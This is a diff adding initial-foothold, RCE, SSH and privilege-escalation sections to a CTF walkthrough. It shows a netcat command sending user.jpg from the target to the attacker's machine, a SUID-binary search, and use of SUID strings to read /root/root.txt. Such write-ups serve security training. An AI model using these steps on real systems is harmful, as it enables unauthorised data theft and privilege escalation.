@@ -58,6 +58,8 @@ After doing it we are able to open it into the browser.
 
 After opening it into the browser.
 
+### Part 2 Initial Foothold
+
 Now when looked up into the source code of the webpage.
 
 We got some useful info in the source code
@@ -193,6 +195,8 @@ After it we are loggedin with those credentials
 
 ![loggedin](https://muirlandoracle.co.uk/wp-content/uploads/2020/03/injectionpage-768x432.png)
 
+
+### Part 3 RCE | Remote Code Execution 
 
 After logging in there is text on screen that is
 
@@ -377,3 +381,91 @@ I got the password and with that password we can now login.
 
 
 But to connect to ssh we need to specify the port cuz the ssh is on port 80 not the default port 22.
+
+The command will be
+
+```sh
+ssh -p 80 jack@<ip>
+
+```
+
+![ssh](https://muirlandoracle.co.uk/wp-content/uploads/2020/03/ssh.png)
+
+Now we can see there is a file named user.jpg.
+
+
+since we will have difficulty into seeing that image.
+
+We are going to extract the imagge to our local machine to open the file.
+
+For this we will setup a listener on our local machine for a specif file that is user.jpg
+
+with the command
+
+```sh
+nc -lvnp 4444 > user.jpg
+```
+
+On the target machine we will open the connection with nc with transversing only that image that is user.jpg
+
+
+The command on host machine is
+
+
+```sh
+nc <tun0 interface ip> 4444 < <file to send that is user.jpg>
+```
+
+After this we got the file on our local machine and here is how taht user.jpg looks like
+
+
+![image](https://muirlandoracle.co.uk/wp-content/uploads/2020/03/userflag-768x744.png)
+
+
+After this we got out flag that is user flag.
+
+
+Now its time for the root flag
+
+
+### Part 4 Privilage Escalation
+
+Doing sudo -l gave me that current user jack has no root permission.
+
+![sudo -l ](https://muirlandoracle.co.uk/wp-content/uploads/2020/01/29-1.png)
+
+
+then checking for cronjob with cat /etc/crontab and crontab -e
+
+But still nothing.
+
+Nothing hidden files in /home folders or subfolders
+
+nothing in /tmp
+
+nothing inside /opt
+
+Nothing inside the /var/www/html and its subdiretories.
+
+
+Our next best bet is finding an executable file with the SUID bit set:
+
+```sh
+find / -type f -user root -perm -4000 -exec ls -ldb {} \; 2>>/dev/null
+```
+
+![img](https://muirlandoracle.co.uk/wp-content/uploads/2020/03/find4000-768x252.png)
+
+One of these stands out as being really unusual: /usr/bin/strings.
+
+strings is usually used to scan a file for human-readable strings of text. It’s very useful if you’re analysing files (e.g. for pulling strings out of compiled binaries, or for looking for signs of steganography having been used). In this case we’re looking for a text file (root.txt). Text files are, unsurprisingly, entirely comprised of strings.
+
+So, for the easiest root flag in the history of CTFs, let’s use /usr/bin/strings to read the flag:
+
+```sh
+/usr/bin/strings /root/root.txt
+```
+
+![lst img](https://muirlandoracle.co.uk/wp-content/uploads/2020/03/rootflag-768x135.png)
+
+That monster! Not only is he trying to kill the penguins for a rug, he’s got a dead body in his garage! Well, at least we’ve got enough to go to the police now. The penguins are saved!
